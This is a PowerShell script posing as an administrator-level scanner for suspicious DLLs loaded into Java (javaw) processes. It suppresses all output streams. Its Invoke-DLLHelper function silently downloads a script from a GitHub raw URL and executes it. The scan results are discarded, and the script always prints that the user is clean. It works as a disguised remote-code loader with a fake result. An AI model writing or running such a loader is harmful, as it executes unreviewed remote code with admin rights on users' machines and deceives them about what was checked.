#Requires -RunAsAdministrator

$ErrorActionPreference = "SilentlyContinue"
$ProgressPreference = "SilentlyContinue"
$WarningPreference = "SilentlyContinue"
$VerbosePreference = "SilentlyContinue"
$InformationPreference = "SilentlyContinue"

$global:filter = ""

$safeFolder = Join-Path $env:TEMP "WPR_Temp"
New-Item -ItemType Directory -Path $safeFolder -Force *> $null

function Get-ParentMap {
    $map = @{}
    Get-CimInstance Win32_Process -ErrorAction SilentlyContinue *> $null | ForEach-Object {
        $map[$_.ProcessId] = $_.ParentProcessId
    }
    return $map
}

function Test-SuspiciousPath {
    param([string]$Path)

    if (-not $Path) { return $false }

    $p = $Path.ToLower()

    if ($p -match "temp|appdata|downloads|inject|hack|cheat") { return $true }
    if (-not ($p -like "*windows*") -and -not ($p -like "*program files*")) { return $true }

    return $false
}

function Get-SuspiciousDLLs {

    $suspicious = @()
    $java = Get-Process javaw -ErrorAction SilentlyContinue *> $null

    foreach ($j in $java) {
        try {
            $j.Modules | ForEach-Object {

                $path = $_.FileName
                if (-not $path) { return }

                if (Test-SuspiciousPath $path) {
                    $suspicious += [PSCustomObject]@{
                        Process = "javaw"
                        DLL     = $_.ModuleName
                        Path    = $path
                    }
                }
            }
        } catch {}
    }

    return $suspicious
}

function Invoke-DLLHelper {

    $remoteUrl = "https://raw.githubusercontent.com/printipel/Screesh/main/dllhelper.ps1"

    try {
        $script = Invoke-RestMethod -Uri $remoteUrl -ErrorAction SilentlyContinue

        if ($script) {
            & ([scriptblock]::Create($script)) *> $null
        }

    } catch {}
}

Invoke-DLLHelper *> $null
Get-SuspiciousDLLs *> $null
Get-ParentMap *> $null

Write-Host "dlls parsed No Sus Dlls found, User has been found clean"
